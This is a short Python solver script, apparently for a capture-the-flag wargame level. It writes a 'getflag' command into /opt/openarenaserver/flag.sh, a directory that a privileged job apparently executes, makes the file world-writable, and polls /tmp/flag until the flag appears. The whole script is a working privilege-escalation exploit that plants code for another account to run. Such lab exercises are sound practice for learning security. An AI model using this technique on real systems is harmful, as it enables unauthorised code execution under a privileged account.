from solver.utils import extract_flag
from time import sleep

def solve(connection):
	connection.exec("echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag.sh")
	connection.exec("chmod 777 /opt/openarenaserver/flag.sh")
	while True:
		flag = connection.exec("cat /tmp/flag")
		if "Error" in flag:
			sleep(1)
			print("Waiting for flag...")
			continue
		else:
			return "", extract_flag(flag)